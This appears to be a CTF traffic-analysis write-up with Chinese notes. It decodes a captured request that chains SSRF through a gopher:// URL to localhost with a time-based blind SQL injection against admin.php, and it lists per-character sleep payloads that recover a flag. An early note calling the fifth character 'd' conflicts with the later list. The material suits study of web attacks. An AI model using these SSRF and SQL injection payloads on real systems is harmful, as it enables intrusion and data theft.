0000   a4 12 32 02 14 69 38 00 25 56 6c 5b 08 00 45 00  ..2..i8.%Vl[..E.
0010   02 77 6d 11 40 00 40 06 00 00 c0 a8 2b 6d 27 69  .wm.@.@.....+m'i
0020   88 c4 df d6 75 49 bc 85 18 86 b7 ee 89 6f 50 18  ....uI.......oP.
0030   01 00 9e ac 00 00 47 45 54 20 2f 69 6e 64 65 78  ......GET /index
0040   2e 70 68 70 3f 75 72 6c 3d 67 6f 70 68 65 72 3a  .php?url=gopher:
0050   2f 2f 31 32 37 2e 30 2e 30 2e 31 3a 38 30 2f 5f  //127.0.0.1:80/_
0060   50 4f 53 54 25 32 30 25 32 46 61 64 6d 69 6e 2e  POST%20%2Fadmin.
0070   70 68 70 25 32 30 48 54 54 50 25 32 46 31 2e 31  php%20HTTP%2F1.1
0080   25 32 35 30 64 25 32 35 30 61 48 6f 73 74 25 33  %250d%250aHost%3
0090   41 25 32 30 6c 6f 63 61 6c 68 6f 73 74 25 33 41  A%20localhost%3A
00a0   38 30 25 32 35 30 64 25 32 35 30 61 43 6f 6e 6e  80%250d%250aConn
00b0   65 63 74 69 6f 6e 25 33 41 25 32 30 63 6c 6f 73  ection%3A%20clos
00c0   65 25 32 35 30 64 25 32 35 30 61 43 6f 6e 74 65  e%250d%250aConte
00d0   6e 74 2d 54 79 70 65 25 33 41 25 32 30 61 70 70  nt-Type%3A%20app
00e0   6c 69 63 61 74 69 6f 6e 25 32 46 78 2d 77 77 77  lication%2Fx-www
00f0   2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64  -form-urlencoded
0100   25 32 35 30 64 25 32 35 30 61 43 6f 6e 74 65 6e  %250d%250aConten
0110   74 2d 4c 65 6e 67 74 68 25 33 41 25 32 30 37 39  t-Length%3A%2079
0120   25 32 35 30 64 25 32 35 30 61 25 32 35 30 64 25  %250d%250a%250d%
0130   32 35 30 61 69 64 25 32 35 33 44 31 25 32 35 32  250aid%253D1%252
0140   39 25 32 35 32 30 61 6e 64 25 32 35 32 30 69 66  9%2520and%2520if
0150   25 32 35 32 38 25 32 35 32 38 61 73 63 69 69 25  %2528%2528ascii%
0160   32 35 32 38 73 75 62 73 74 72 25 32 35 32 38 25  2528substr%2528%
0170   32 35 32 38 73 65 6c 65 63 74 25 32 35 32 30 66  2528select%2520f
0180   6c 61 67 25 32 35 32 30 66 72 6f 6d 25 32 35 32  lag%2520from%252
0190   30 66 6c 61 67 25 32 35 32 39 25 32 35 32 43 35  0flag%2529%252C5
01a0   25 32 35 32 43 31 25 32 35 32 39 25 32 35 32 39  %252C1%2529%2529
01b0   25 32 35 33 44 25 32 35 32 37 31 30 30 25 32 35  %253D%2527100%25
01c0   32 37 25 32 35 32 39 25 32 35 32 43 73 6c 65 65  27%2529%252Cslee
01d0   70 25 32 35 32 38 33 25 32 35 32 39 25 32 35 32  p%25283%2529%252
01e0   43 30 25 32 35 32 39 25 32 35 32 30 2d 2d 25 32  C0%2529%2520--%2
01f0   35 32 30 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f  520 HTTP/1.1..Ho
0200   73 74 3a 20 33 39 2e 31 30 35 2e 31 33 36 2e 31  st: 39.105.136.1
0210   39 36 3a 33 30 30 32 35 0d 0a 55 73 65 72 2d 41  96:30025..User-A
0220   67 65 6e 74 3a 20 70 79 74 68 6f 6e 2d 72 65 71  gent: python-req
0230   75 65 73 74 73 2f 32 2e 32 34 2e 30 0d 0a 41 63  uests/2.24.0..Ac
0240   63 65 70 74 2d 45 6e 63 6f 64 69 6e 67 3a 20 67  cept-Encoding: g
0250   7a 69 70 2c 20 64 65 66 6c 61 74 65 0d 0a 41 63  zip, deflate..Ac
0260   63 65 70 74 3a 20 2a 2f 2a 0d 0a 43 6f 6e 6e 65  cept: */*..Conne
0270   63 74 69 6f 6e 3a 20 6b 65 65 70 2d 61 6c 69 76  ction: keep-aliv
0280   65 0d 0a 0d 0a                                   e....

Content-Length%3A%2079%250d%250a%250d%250aid%253D1%2529%2520and%2520if%2528%2528ascii%2528substr%2528%2528select%2520flag%2520from%2520flag%2529%252C5%252C1%2529%2529%253D%2527100%2527%2529%252Csleep%25283%2529%252C0%2529%2520--%2

url解码一次（%编码为%25）
Content-Length: 79%0d%0a%0d%0aid%3D1%29%20and%20if%28%28ascii%28substr%28%28select%20flag%20from%20flag%29%2C5%2C1%29%29%3D%27100%27%29%2Csleep%283%29%2C0%29%20--%2

url再解码一次
Content-Length: 79

id=1) and if((ascii(substr((select flag from flag),5,1))='100'),sleep(3),0) --%2

--> flag第五位为d

http://39.105.136.196:30025/index.php?url=gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2Fx-www-form-urlencoded%250d%250aContent-Length: 79%0d%0a%0d%0aid%3D1%29%20and%20if%28%28ascii%28substr%28%28select%20flag%20from%20flag%29%2C5%2C1%29%29%3D%27100%27%29%2Csleep%283%29%2C0%29%20--%2

-->两次解码
http://39.105.136.196:30025/index.php?url=gopher://127.0.0.1:80/_POST /admin.php HTTP/1.1
Host: localhost:80
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 79

id=1) and if((ascii(substr((select flag from flag),5,1))='100'),sleep(3),0) --%2




--> 检查http流量包，如果响应间隔为3秒则说明该数据包sql注入成功，即flag注入成功
id=1) and if((ascii(substr((select flag from flag),1,1))='102'),sleep(3),0) --     
id=1) and if((ascii(substr((select flag from flag),2,1))='108'),sleep(3),0) --
id=1) and if((ascii(substr((select flag from flag),3,1))='97'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),4,1))='103'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),5,1))='123'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),6,1))='49'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),7,1))='113'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),8,1))='119'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),9,1))='121'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),10,1))='50'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),11,1))='55'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),12,1))='56'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),13,1))='49'),sleep(3),0) -- 
id=1) and if((ascii(substr((select flag from flag),14,1))='125'),sleep(3),0) -- 